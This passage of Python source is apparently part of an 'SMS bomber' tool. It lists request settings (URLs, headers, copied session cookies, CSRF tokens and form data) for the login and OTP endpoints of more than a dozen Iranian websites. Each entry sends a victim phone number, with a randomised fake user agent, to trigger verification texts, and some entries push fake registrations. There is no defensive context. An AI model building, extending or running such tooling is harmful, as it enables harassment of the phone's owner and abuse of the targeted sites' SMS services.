    # 'cookie': 'PHPSESSID=havdmbnjqor4bmt3km1ubevnj3; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=33bd200a-66de-3e3a-ef0f-b9a978493ca3; analytics_session_token=3b44d375-b6f1-37ea-273e-05250f751553; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; form_key=1YdpiEYiwvXJXBth; mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-cache-sessid=true; _clck=fbl6v7|2|fep|0|1341; _gid=GA1.2.138190209.1693742687; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; form_key=1YdpiEYiwvXJXBth; _ga_C124JHH4KZ=GS1.1.1693742686.1.1.1693742740.0.0.0; _ga=GA1.2.128086731.1693742686; _clsk=14bsq6u|1693742741022|3|1|t.clarity.ms/collect; private_content_version=0a6427f684abd69235ce54fc8d68247f',
    'origin': 'https://darmankala.com',
    'referer': 'https://darmankala.com/customer/account/login/referer/aHR0cHM6Ly9kYXJtYW5rYWxhLmNvbS9jdXN0b21lci9hY2NvdW50L2luZGV4Lw%2C%2C/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data93 = {
    'user': num,
    'pass': '',
    'my_pass': '',
    'customer_set_password': '',
    'customer_set_password_mobile': '',
    'validate': 'NaN',
    'form_key': '1YdpiEYiwvXJXBth',
    'type': 'one-time-pass2',
}

url94 = "https://ithome.ir/wp-admin/admin-ajax.php"
cookies94 = {
    'PHPSESSID': '2d54726ef68bcabf1a25eacc6a496e63',
    '_ga_D87J1VQNTQ': 'GS1.1.1693743506.1.0.1693743506.60.0.0',
    '_ga': 'GA1.2.1212832607.1693743507',
    '_gid': 'GA1.2.281522466.1693743507',
    '_gat_UA-198389083-1': '1',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': 'f47e0f63-cbf2-8120-9151-c24b6c3e2836',
    'analytics_session_token': 'e78005ee-71b1-20c8-fc91-f33c36959182',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_clck': 'h9ts7g|2|fep|0|1341',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_clsk': 'l9rlli|1693743513055|1|1|t.clarity.ms/collect',
}

headers94 = {
    'authority': 'ithome.ir',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=2d54726ef68bcabf1a25eacc6a496e63; _ga_D87J1VQNTQ=GS1.1.1693743506.1.0.1693743506.60.0.0; _ga=GA1.2.1212832607.1693743507; _gid=GA1.2.281522466.1693743507; _gat_UA-198389083-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=f47e0f63-cbf2-8120-9151-c24b6c3e2836; analytics_session_token=e78005ee-71b1-20c8-fc91-f33c36959182; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _clck=h9ts7g|2|fep|0|1341; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _clsk=l9rlli|1693743513055|1|1|t.clarity.ms/collect',
    'origin': 'https://ithome.ir',
    'referer': 'https://ithome.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data94 = {
    'mobile': num,
    'account_detection_nonce_field': 'da7fefed98',
    '_wp_http_referer': '/',
    'action': 'websima_auth_account_detection',
}

url95 = "https://backend.corumofficial.com/web-api/login"
headers95 = {
    'authority': 'backend.corumofficial.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'authorization': '',
    'content-type': 'application/json',
    'origin': 'https://corumofficial.com',
    'referer': 'https://corumofficial.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': fake.random,
}

json_data95 = {
    'mobile': num,
}

url96 = "https://api.homehr.ir/api/front/auth/authUser"
headers96 = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/json;charset=UTF-8',
    'Origin': 'https://homehr.ir',
    'Referer': 'https://homehr.ir/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': fake.random,
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

json_data96 = {
    'number': num,
    'type': 'mobile',
    'action': 'Number',
    'count': True,
}


url97 = "https://neevstyle.com/wp-admin/admin-ajax.php"
cookies97 = {
    'd_user_session': 'effa3a5762f1ad333c435cb2905b6fd64c4048cb0ebc5a45c7189b62f73b2c43af7474da8e54eb795eea4c5a95152b9f747910e47a304482ba53a99cffaa76fe',
    '_ga': 'GA1.1.200104247.1693744860',
    '_ga_MN6VEVQL2V': 'GS1.1.1693744860.1.0.1693744868.0.0.0',
    'PHPSESSID': '63fed2021bd3a0a7a8a05c6b9289d2d0',
}

headers97 = {
    'authority': 'neevstyle.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'd_user_session=effa3a5762f1ad333c435cb2905b6fd64c4048cb0ebc5a45c7189b62f73b2c43af7474da8e54eb795eea4c5a95152b9f747910e47a304482ba53a99cffaa76fe; _ga=GA1.1.200104247.1693744860; _ga_MN6VEVQL2V=GS1.1.1693744860.1.0.1693744868.0.0.0; PHPSESSID=63fed2021bd3a0a7a8a05c6b9289d2d0',
    'origin': 'https://neevstyle.com',
    'referer': 'https://neevstyle.com/?login=true&page=1&redirect_to=https%3A%2F%2Fneevstyle.com%2F',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data97 = {
    'action_type': 'phone',
    'digt_countrycode': '+98',
    'phone': num0,
    'email': '',
    'digits_reg_name': 'سعید کلوچه',
    'digits_reg_password': '12345678هعفققصثسیق',
    'digits_process_register': '1',
    'optional_email': '',
    'is_digits_optional_data': '1',
    'sms_otp': '',
    'digits_otp_field': '1',
    'instance_id': '9be823d9460de008b29e66cb5ae8cab3',
    'optional_data': 'email',
    'action': 'digits_forms_ajax',
    'type': 'register',
    'dig_otp': 'otp',
    'digits': '1',
    'digits_redirect_page': '//neevstyle.com/?page=1&redirect_to=https%3A%2F%2Fneevstyle.com%2F',
    'digits_form': '4f802fa8a9',
    '_wp_http_referer': '/?login=true&page=1&redirect_to=https%3A%2F%2Fneevstyle.com%2F',
    'container': 'digits_protected',
    'sub_action': 'sms_otp',
}


url98 = "https://extramod.ir/ajax/send_sms_active"
cookies98 = {
    'XSRF-TOKEN': 'eyJpdiI6Ilwvc0xzRE1VWXo5NzllUEluMWpqMW9nPT0iLCJ2YWx1ZSI6IkJEVVBDRVhGK2RpUDVNSXJlbWptVHVYZXlJUVJKaXhHXC94UmRyTFwvdFNlQit1ZVRuamZZXC9RTXJLVGdiSGNuQWMiLCJtYWMiOiIyNzY0ODA1NWVjZWVmODBkNzNkYzQxMGFjNjEyNzgxNjBkYmM1ZmYxNWE3NjJiMmI1MjRiMTNhM2Y5ZmIwNTA0In0%3D',
    'laravel_session': 'eyJpdiI6Ilwvc0VqVzlxMmZtcUI4WjJBcmNFRDV3PT0iLCJ2YWx1ZSI6IjNZSlJjdjhMaGhPMCtQWG84dHhnd3JhdXJcLzA2cExUM21DSVo3bzlINUhNQzFLWDdQRFltN3FlQ2JrbGdYZ1dmeFhnMFlcL2h6S05iRUZjUk1vdllETzJDbjVQMUF4RlRcL1FVaTZDcnNuRnRLM3YxdG9qNkNzS0k5SDJmRWt1dDhIIiwibWFjIjoiZmE3MGE4ZjY3ZmFmMjhhN2JiMzc3NDAzMGFmZDY3N2QwNzdjN2MzMzI5ZWUyODhmNWM2OWE3YTU5Y2NhY2FhMCJ9',
}

headers98 = {
    'authority': 'extramod.ir',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'XSRF-TOKEN=eyJpdiI6Ilwvc0xzRE1VWXo5NzllUEluMWpqMW9nPT0iLCJ2YWx1ZSI6IkJEVVBDRVhGK2RpUDVNSXJlbWptVHVYZXlJUVJKaXhHXC94UmRyTFwvdFNlQit1ZVRuamZZXC9RTXJLVGdiSGNuQWMiLCJtYWMiOiIyNzY0ODA1NWVjZWVmODBkNzNkYzQxMGFjNjEyNzgxNjBkYmM1ZmYxNWE3NjJiMmI1MjRiMTNhM2Y5ZmIwNTA0In0%3D; laravel_session=eyJpdiI6Ilwvc0VqVzlxMmZtcUI4WjJBcmNFRDV3PT0iLCJ2YWx1ZSI6IjNZSlJjdjhMaGhPMCtQWG84dHhnd3JhdXJcLzA2cExUM21DSVo3bzlINUhNQzFLWDdQRFltN3FlQ2JrbGdYZ1dmeFhnMFlcL2h6S05iRUZjUk1vdllETzJDbjVQMUF4RlRcL1FVaTZDcnNuRnRLM3YxdG9qNkNzS0k5SDJmRWt1dDhIIiwibWFjIjoiZmE3MGE4ZjY3ZmFmMjhhN2JiMzc3NDAzMGFmZDY3N2QwNzdjN2MzMzI5ZWUyODhmNWM2OWE3YTU5Y2NhY2FhMCJ9',
    'origin': 'https://extramod.ir',
    'referer': 'https://extramod.ir/user/login',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-csrf-token': 'rxEJB2dThMhyvC8l3M0rRjGKC5c3OzQlFqhknY97',
    'x-requested-with': 'XMLHttpRequest',
}

data98 = {
    'mobile': num,
}

url99 = "https://bakhshi.shop/wp-admin/admin-ajax.php"
cookies99 = {
    '_ga': 'GA1.1.127690826.1693745023',
    'digits_countrycode': '98',
    '_ga_W7VK52GWQT': 'GS1.1.1693745022.1.0.1693745026.0.0.0',
}

headers99 = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': '_ga=GA1.1.127690826.1693745023; digits_countrycode=98; _ga_W7VK52GWQT=GS1.1.1693745022.1.0.1693745026.0.0.0',
    'Origin': 'https://bakhshi.shop',
    'Referer': 'https://bakhshi.shop/?login=true&page=1&redirect_to=https://bakhshi.shop/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': fake.random,
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

data99 = {
    'action': 'digits_check_mob',
    'countrycode': '+98',
    'mobileNo': num0,
    'csrf': '9fcf3f8308',
    'login': '1',
    'username': '',
    'email': '',
    'captcha': '',
    'captcha_ses': '',
    'digits': '1',
    'json': '1',
    'whatsapp': '0',
    'mobmail': num,
    'dig_otp': '',
    'digits_login_remember_me': '1',
    'dig_nounce': '9fcf3f8308',
}


url100 = "https://www.golsetan.com/wp-json/panel/v1/auth/sendMobileAuth"
headers100 = {
    'authority': 'www.golsetan.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://panel.golsetan.com',
    'referer': 'https://panel.golsetan.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': fake.random,
}

json_data100 = {
    'phoneNumber': num,
}


url101 = "https://beniix.ir/users/login"
cookies101 = {
    '_ga': 'GA1.1.1526580836.1693745169',
    'XSRF-TOKEN': 'eyJpdiI6IjI0QjMxaXdydE95QkUyQi8zckFTR1E9PSIsInZhbHVlIjoicnZlSElKTnFseEVCNEdWcWdDNnZUYlpjVVY3enJqOEQ3V1d6NVR5bWRZb1kyV3RpRGZ5dGMybmY3QWI1NUp0U0ZLcEd3c2xqeWFLYW9PQmVYSTF6UGZCdVBFYlhrdjc1V2Q4Y0NyUUxwSXZoc0VacTkvSEE3ZVdHREZhL0VxRHMiLCJtYWMiOiI3MzRjOGFiZWFhY2I0YTVlMzMyM2Q0NDI2MWIwOTM2YTIyNmMwNDFkN2IzMjZiNGMxN2Y5NzQ2NzhkNTY2NzY1IiwidGFnIjoiIn0%3D',
    'bnyks_session': 'eyJpdiI6IjU5emt1Ulh4MG1UNUYvTmhCbEtVdXc9PSIsInZhbHVlIjoiUllSLzhOYlJoeHFYbXpOd0ZQOWVvWUdLMXJ6TjdkMTBYejBORWt3bVZYSDNZTWpBd2ZTV2xrWVo3OXYyMjJ3dlo2QmxhaDZybWQybU9qYUFJVUh3c3YxRnZxZmJySmpNblNpUzJ4a2VhSlNNSVVCZ2Z2RUpZUis2SW1WTFlxSXkiLCJtYWMiOiIxNGE0MDNhZDcyZWIzZWQ3OGFlZTczZDRlZmI2NzM5MmNmNDI5NjUxMWQwMDliMjkyYTA0NmFkMWQzNjNjYzY5IiwidGFnIjoiIn0%3D',
    '_ga_RTM2V9LDGP': 'GS1.1.1693745168.1.0.1693745170.58.0.0',
}

headers101 = {
    'authority': 'beniix.ir',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_ga=GA1.1.1526580836.1693745169; XSRF-TOKEN=eyJpdiI6IjI0QjMxaXdydE95QkUyQi8zckFTR1E9PSIsInZhbHVlIjoicnZlSElKTnFseEVCNEdWcWdDNnZUYlpjVVY3enJqOEQ3V1d6NVR5bWRZb1kyV3RpRGZ5dGMybmY3QWI1NUp0U0ZLcEd3c2xqeWFLYW9PQmVYSTF6UGZCdVBFYlhrdjc1V2Q4Y0NyUUxwSXZoc0VacTkvSEE3ZVdHREZhL0VxRHMiLCJtYWMiOiI3MzRjOGFiZWFhY2I0YTVlMzMyM2Q0NDI2MWIwOTM2YTIyNmMwNDFkN2IzMjZiNGMxN2Y5NzQ2NzhkNTY2NzY1IiwidGFnIjoiIn0%3D; bnyks_session=eyJpdiI6IjU5emt1Ulh4MG1UNUYvTmhCbEtVdXc9PSIsInZhbHVlIjoiUllSLzhOYlJoeHFYbXpOd0ZQOWVvWUdLMXJ6TjdkMTBYejBORWt3bVZYSDNZTWpBd2ZTV2xrWVo3OXYyMjJ3dlo2QmxhaDZybWQybU9qYUFJVUh3c3YxRnZxZmJySmpNblNpUzJ4a2VhSlNNSVVCZ2Z2RUpZUis2SW1WTFlxSXkiLCJtYWMiOiIxNGE0MDNhZDcyZWIzZWQ3OGFlZTczZDRlZmI2NzM5MmNmNDI5NjUxMWQwMDliMjkyYTA0NmFkMWQzNjNjYzY5IiwidGFnIjoiIn0%3D; _ga_RTM2V9LDGP=GS1.1.1693745168.1.0.1693745170.58.0.0',
    'origin': 'https://beniix.ir',
    'referer': 'https://beniix.ir/users/login',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': fake.random,
}

data101 = {
    '_token': 'lNlk7xtRGU6IgMCqCOd1Zn1DYz7APhYK8KvPOuQj',
    'mobile': num,
}


url102 = "https://shop.cerita.ir/wp-admin/admin-ajax.php"
cookies102 = {
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '5688f029-7bfa-7f55-0703-601df152ab99',
    'analytics_session_token': 'f15bab5d-5619-57b2-7c21-e66609120cab',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_gid': 'GA1.2.1659117556.1693745224',
    '_gat_UA-233191356-1': '1',
    '_ga_JNYR6Y8J87': 'GS1.1.1693745223.1.0.1693745223.0.0.0',
    '_ga': 'GA1.1.1375856429.1693745224',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    'PHPSESSID': '8770c95a43bb01f916c36be43b9d3528',
    'd_user_session': '044f32a1fdf0a4a570f45935ca28352384fb29824490da97ed34e434d8b864b31f31ecb4290b7aded5b5315109fb2c932b89273891aa1d44917ae539005e6fa6',
}

headers102 = {
    'authority': 'shop.cerita.ir',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=5688f029-7bfa-7f55-0703-601df152ab99; analytics_session_token=f15bab5d-5619-57b2-7c21-e66609120cab; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _gid=GA1.2.1659117556.1693745224; _gat_UA-233191356-1=1; _ga_JNYR6Y8J87=GS1.1.1693745223.1.0.1693745223.0.0.0; _ga=GA1.1.1375856429.1693745224; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; PHPSESSID=8770c95a43bb01f916c36be43b9d3528; d_user_session=044f32a1fdf0a4a570f45935ca28352384fb29824490da97ed34e434d8b864b31f31ecb4290b7aded5b5315109fb2c932b89273891aa1d44917ae539005e6fa6',
    'origin': 'https://shop.cerita.ir',
    'referer': 'https://shop.cerita.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data102 = {
    'digits_reg_name': 'اصغر',
    'digits_reg_lastname': 'موبلا',
    'digt_countrycode': '+98',
    'phone': num0,
    'digits_process_register': '1',
    'sms_otp': '',
    'digits_otp_field': '1',
    'instance_id': 'aada5af3e4b2653c7bea28650e3da4a5',
    'optional_data': 'optional_data',
    'action': 'digits_forms_ajax',
    'type': 'register',
    'dig_otp': 'otp',
    'digits': '1',
    'digits_redirect_page': '//shop.cerita.ir/',
    'digits_form': 'f16b9a5f52',
    '_wp_http_referer': '/',
    'container': 'digits_protected',
    'sub_action': 'sms_otp',
}

url103 = "https://styleup.ir/wp-content/plugins/styleup-login-register/include/custom-ajax-handler/ajax.php"
cookies103 = {
    'PHPSESSID': '6adcaef494410a1fc2b74401575debac',
    '_gid': 'GA1.2.1545763405.1693745293',
    '_gat_gtag_UA_98744058_1': '1',
    '_ga_B5G669VEVJ': 'GS1.1.1693745292.1.1.1693745307.0.0.0',
    '_ga': 'GA1.2.2045905007.1693745293',
}

headers103 = {
    'authority': 'styleup.ir',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=6adcaef494410a1fc2b74401575debac; _gid=GA1.2.1545763405.1693745293; _gat_gtag_UA_98744058_1=1; _ga_B5G669VEVJ=GS1.1.1693745292.1.1.1693745307.0.0.0; _ga=GA1.2.2045905007.1693745293',
    'origin': 'https://styleup.ir',
    'referer': 'https://styleup.ir/my-account/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data103 = {
    'action': 'verify_user_login',
    'fast_ajax': 'true',
    'user': num,
    'duty': 'send_otp_to_user',
}

url104 = "https://modlight.ir/wp-admin/admin-ajax.php"
cookies104 = {
    'digits_countrycode': '98',
    '_ga': 'GA1.1.902764609.1693745369',
    '_ga_7W3PK16KR6': 'GS1.1.1693745368.1.0.1693745369.0.0.0',
    'HstCfa4581120': '1693745371969',
    'HstCla4581120': '1693745371969',
    'HstCmu4581120': '1693745371969',
    'HstPn4581120': '1',
    'HstPt4581120': '1',
    'HstCnv4581120': '1',
    'HstCns4581120': '1',
    'c_ref_4581120': 'https%3A%2F%2Fwww.google.com%2F',
}

headers104 = {
    'authority': 'modlight.ir',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'digits_countrycode=98; _ga=GA1.1.902764609.1693745369; _ga_7W3PK16KR6=GS1.1.1693745368.1.0.1693745369.0.0.0; HstCfa4581120=1693745371969; HstCla4581120=1693745371969; HstCmu4581120=1693745371969; HstPn4581120=1; HstPt4581120=1; HstCnv4581120=1; HstCns4581120=1; c_ref_4581120=https%3A%2F%2Fwww.google.com%2F',
    'origin': 'https://modlight.ir',
    'referer': 'https://modlight.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data104 = {
    'action': 'digits_check_mob',
    'countrycode': '+98',
    'mobileNo': num0,
    'csrf': '4183392a65',
    'login': '2',
    'username': '',
    'email': '',
    'captcha': '',
    'captcha_ses': '',
    'digits': '1',
    'json': '1',
    'whatsapp': '0',
    'digregcode': '+98',
    'digits_reg_mail': num0,
    'digits_reg_password': '12345678عطفطقسیثصقسب',
    'dig_otp': '',
    'code': '',
    'dig_reg_mail': '',
    'dig_nounce': '4183392a65',
}


url105 = "https://refahmarket.ir/store/customer_otp_old"
cookies105 = {
    'refahmarket': 'rlcra9nq1hnuq3rqs7g7622cv0',
    'selector2': 'https://refahmarket.ir/home/fmcg',
    '_ga_YLRS0WR96X': 'GS1.1.1693745616.1.0.1693745616.0.0.0',
    '_ga': 'GA1.2.1021722865.1693745616',
    '_gid': 'GA1.2.490018770.1693745617',
    '_gat_gtag_UA_160204913_1': '1',
}

headers105 = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
    'Connection': 'keep-alive',
    'Content-type': 'application/x-www-form-urlencoded',
    # 'Cookie': 'refahmarket=rlcra9nq1hnuq3rqs7g7622cv0; selector2=https://refahmarket.ir/home/fmcg; _ga_YLRS0WR96X=GS1.1.1693745616.1.0.1693745616.0.0.0; _ga=GA1.2.1021722865.1693745616; _gid=GA1.2.490018770.1693745617; _gat_gtag_UA_160204913_1=1',
    'Origin': 'https://refahmarket.ir',
    'Referer': 'https://refahmarket.ir/home/fmcg',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': fake.random,
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

data105 = {
    'task': 'customer_phone',
    'mobile_number': num,
}

url106 = "https://urmode.com/login_pwa/reg_api"
cookies106 = {
    'PHPSESSID': 'offh6a23uef2hlgptoegp8auh8',
    'phone': '09915418996',
}

headers106 = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'PHPSESSID=offh6a23uef2hlgptoegp8auh8; phone=09915418996',
    'Origin': 'https://urmode.com',
    'Referer': 'https://urmode.com/login_pwa/register/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': fake.random,
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

data106 = {
    'phone_number': num,
    'f_name': '',
    'fast': '1',
}

url107 = "https://setshoe.ir/wp-admin/admin-ajax.php"
cookies107 = {
    'PHPSESSID': '01a6ccb3a52322e10eec5ecdaeaae8c0',
}

headers107 = {
    'authority': 'setshoe.ir',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'PHPSESSID=01a6ccb3a52322e10eec5ecdaeaae8c0',
    'origin': 'https://setshoe.ir',
    'referer': 'https://setshoe.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data107 = {
    'action': 'stm_login_register',
    'type': 'mobile',
    'input': num,
}

url108 = "https://respina24.ir/login/sendAuthCode"
cookies108 = {
    'samesite': '1',
    '_ga_JE39P9W7NG': 'GS1.1.1693745953.1.0.1693745953.0.0.0',
    '_ga': 'GA1.2.1295484615.1693745954',
    '_gid': 'GA1.2.889902351.1693745954',
    '_gat_gtag_UA_167755033_1': '1',
    'ci_session': '%2BFKqKkvMGO5Vvz%2B6OKNLZtpZmhda69enkyfxSFob9QcX3ckkavbcGTJfo%2FUOFdvzls%2BAsW2YCwZ%2FsYX3asMrUyDbxnUz9OP5Ko1Lwinw%2FNmVY8txbIbT%2Ff9FtgzWZwoM0VXubwxc277PMsXsOB6m4Mp6BQ4GMEBfoq5ohTTOh2rZivJWutcvOCLzet4Yw1%2FYqrHPd1HVuclvRg7zCS9e94XgkoCrUndQDO5mdMt1KWmtQ8AeuSEfhjjeAxRyINvYVvmmppy8hRjrOrbZr%2BpCiDSSDWAb2yr1NOygaHiAdpVyZ3TUTxKKdmW9y%2BVVqSJtkrXg9Ny0mJhcwwyuohZemhQY90r6LVUk0bREGuvUlFXjbbJBnmi9h42f5WddDVLIOsuIvVMjoFCJVsjTtfR0eZToOgIZM4%2F2ioEALaasANk%3D',
}

headers108 = {
    'authority': 'respina24.ir',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/json;charset=UTF-8',
